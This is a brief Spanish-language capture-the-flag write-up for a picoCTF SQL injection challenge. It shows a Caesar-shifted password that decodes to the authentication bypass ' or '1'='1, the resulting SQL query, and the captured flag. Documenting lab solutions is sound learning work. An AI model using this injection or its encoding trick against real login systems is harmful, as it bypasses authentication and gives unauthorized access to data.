
## Objetivo

## Solución
```
entro con :abcdefghijklmnopqrstuvwxyz
decodifico con cada 7
al resultado le agrego la decodificacion mas ' or '1'='1
al resultado de lo anterior le agrego ' be '1'='1

password: hijklmnopqrstuvwxyzabcdefg' be '1'='1
SQL query: SELECT * FROM admin where password = 'uvwxyzabcdefghijklmnopqrst' or '1'='1'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```
## Notas adicionales
## Referencias 
https://cryptii.com/pipes/caesar-cipher
